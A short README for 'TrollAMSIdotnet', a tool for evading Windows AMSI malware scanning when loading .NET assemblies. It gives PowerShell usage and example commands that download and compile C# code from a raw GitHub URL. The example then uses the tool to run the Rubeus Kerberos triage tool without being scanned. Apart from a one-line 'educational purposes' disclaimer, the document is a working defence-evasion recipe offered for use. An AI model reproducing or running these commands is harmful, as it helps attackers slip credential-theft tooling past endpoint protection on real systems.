# TrollAMSIdotnet
TrollAMSI only bypasses powershell's amsi and not the CLR amsi. 



  
## Usage 
```
add-type -path (iwr https://raw.githubusercontent.com/cybersectroll/TrollAMSIdotnet/main/trollamsidotnet.cs).content
$bytes = <BYTE_ARRAY_DOWNLOAD>
$assemblyname = <ASSEMBLY_NAME>
$asm = [TrollAMSIdotnet]::Load($bytes,$assemblyname) 

[string[]]$args = "<ARGUMENT_TO_ASSEMBLY>", "<ARGUMENT_TO_ASSEMBLY>"
[TrollAMSIdotnet]::Invoke($asm,$args)
```

## Example 
```
add-type -path (iwr https://raw.githubusercontent.com/cybersectroll/TrollAMSIdotnet/main/trollamsidotnet.cs).content
$bytes = [System.IO.File]::ReadAllBytes("C:\Troll.exe")
$assemblyname = "Rubeus.exe"
$asm = [TrollAMSIdotnet]::Load($bytes,$assemblyname) 

[string[]]$args = "triage", "/consoleoutfile:C:\FILE.txt"
[TrollAMSIdotnet]::Invoke($asm,$args)
```


## Disclaimer
Should only be used for educational purposes!
